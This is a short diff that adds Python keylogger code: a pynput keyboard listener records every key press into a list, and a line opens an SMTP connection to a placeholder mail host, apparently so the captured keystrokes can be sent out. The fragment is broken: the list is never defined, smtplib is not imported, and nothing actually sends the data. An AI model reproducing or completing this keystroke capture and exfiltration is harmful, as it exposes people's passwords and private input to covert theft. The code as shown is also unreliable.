@@ -1,0 +1,5 @@
+from pynput.keyboard import Key, Listener
+def on_press(key): keylog.append(key)
+with Listener(on_press=on_press) as l: l.join()
+smtplib.SMTP("smtp.example.invalid", 587)
+
